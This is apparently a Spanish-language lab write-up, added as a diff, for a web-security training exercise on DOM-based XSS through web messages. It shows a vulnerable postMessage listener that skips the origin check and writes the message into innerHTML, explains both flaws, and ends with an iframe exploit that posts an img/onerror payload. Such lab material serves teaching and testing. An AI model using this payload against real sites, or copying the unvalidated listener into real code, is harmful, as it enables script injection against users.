@@ -1,0 +1,26 @@
+Nota que la página de inicio contiene una función addEventListener() que escucha mensajes web (web messages)
+
+Para entender por qué se vuelve vulnerable, hay que ver lo que suele hacer el código JavaScript de la víctima por dentro:
+JavaScript
+
+// Código vulnerable en la página de la víctima
+window.addEventListener('message', function(event) {
+    // 1. No verifica quién envía el mensaje (event.origin)
+    
+    // 2. Toma el mensaje y lo inserta directo en el HTML
+    document.getElementById('contenedor').innerHTML = event.data;
+});
+
+Los 2 fallos que permiten el ataque
+
+    Ausencia de validación del origen (event.origin):
+
+    Al no incluir una verificación como if (event.origin !== '[https://tu-sitio-seguro.com](https://tu-sitio-seguro.com)') return;, la página acepta mensajes de cualquier origen. El parámetro '*' que envía el atacante indica que el mensaje se entrega sin importar quién esté escuchando o enviando.
+
+    Inyección directa en el DOM (innerHTML u otros sinks inseguros):
+
+    El receptor confía a ciegas en event.data y lo asigna a una propiedad que interpreta código HTML/JavaScript. Al recibir <img src=1 onerror=print()>, el navegador parsea la etiqueta HTML, intenta cargar la imagen inexistente 1, y ejecuta de inmediato el script del evento onerror.
+
+
+
+<iframe src="[https://TU-ID-DE-LABORATORIO.web-security-academy.net/](https://TU-ID-DE-LABORATORIO.web-security-academy.net/)" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
